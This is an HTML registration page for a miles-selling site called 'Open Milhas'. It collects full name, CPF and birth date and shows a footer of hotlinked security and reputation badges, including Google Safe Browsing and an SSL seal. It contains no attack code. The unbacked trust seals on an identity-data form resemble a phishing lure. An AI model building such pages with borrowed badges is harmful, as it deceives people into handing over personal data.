<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Milhas | Completar Cadastro</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
    <style>
        :root { --primary-color: #2c7da0; --accent-gold: #c5a059; --bg-light: #f8f9fa; }
        body { background-color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #333; }
        
        /* Header Estilizado */
        .navbar-top { padding: 20px 0; border-bottom: 1px solid #eee; background: white; }
        .logo-text { font-size: 1.5rem; font-weight: 800; color: #0a1128; text-decoration: none; }
        .logo-text span { color: var(--accent-gold); }
        
        /* Barra de progresso profissional */
        .progress-bar-custom { height: 10px; background-color: #e9ecef; border-radius: 10px; margin: 30px 0; overflow: hidden; }
        .progress-fill { height: 100%; background-color: var(--primary-color); width: 33%; transition: 0.5s ease; }
        
        /* Inputs modernos e arredondados */
        .form-control { border-radius: 50px; border: 1px solid #ddd; padding: 15px 25px; margin-bottom: 20px; }
        .btn-continue { background-color: #469cb4; color: white; border-radius: 50px; padding: 12px 45px; border: none; font-weight: bold; transition: 0.3s; }
        .btn-continue:hover { background-color: var(--primary-color); }

        /* RODAPÉ DE CONFIANÇA CORRIGIDO */
        .footer-trust { background: #fdfdfd; border-top: 1px solid #eee; padding: 40px 0; margin-top: 60px; }
        .trust-title { color: #555; font-size: 0.9rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 25px; }
        .badge-img { height: 40px; margin: 0 20px; filter: grayscale(100%); opacity: 0.6; transition: 0.3s; }
        .badge-img:hover { filter: grayscale(0); opacity: 1; }
    </style>
</head>
<body>

    <header class="navbar-top">
        <div class="container d-flex justify-content-between align-items-center">
            <a href="#" class="logo-text">OPEN <span>MILHAS</span></a>
            <div class="d-none d-md-block text-muted small">Vender Milhas > <span class="text-dark fw-bold">Cadastro</span></div>
        </div>
    </header>

    <div class="container mt-5" style="max-width: 800px;">
        <h2 class="fw-bold text-center">Complete seu cadastro</h2>
        
        <div class="progress-bar-custom">
            <div class="progress-fill"></div>
        </div>

        <form action="/login" method="POST">
            <div class="row">
                <div class="col-md-12"><input type="text" name="nome" class="form-control" placeholder="Nome completo *" required></div>
                <div class="col-md-6"><input type="text" name="cpf" class="form-control" placeholder="CPF *" id="cpfInput" required></div>
                <div class="col-md-6"><input type="date" name="data_nasc" class="form-control" required title="Data de Nascimento"></div>
            </div>
            <div class="text-end mt-4">
                <button type="submit" class="btn-continue">Continuar <i class="fas fa-arrow-right ms-2"></i></button>
            </div>
        </form>
    </div>

    <footer class="footer-trust text-center">
        <div class="container">
            <p class="trust-title">Plataforma Segura e Homologada</p>
            <div class="d-flex justify-content-center align-items-center flex-wrap gap-3">
                <img src="https://logodownload.org/wp-content/uploads/2017/11/reclame-aqui-logo.png" class="badge-img" alt="Reclame Aqui">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Google_Safe_Browsing_logo.svg/1200px-Google_Safe_Browsing_logo.svg.png" class="badge-img" alt="Google Safe Browsing">
                <img src="https://static.wixstatic.com/media/2cd43b_7f8674b65d3a43399659f8c853177695~mv2.png/v1/fill/w_320,h_102,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/Selo%20Seguro%20SSL.png" class="badge-img" alt="Selo SSL Seguro">
            </div>
            <p class="mt-5 text-muted small">OPEN MILHAS &copy; 2026 | CNPJ: 26.878.221/0001-50</p>
        </div>
    </footer>

</body>
</html>
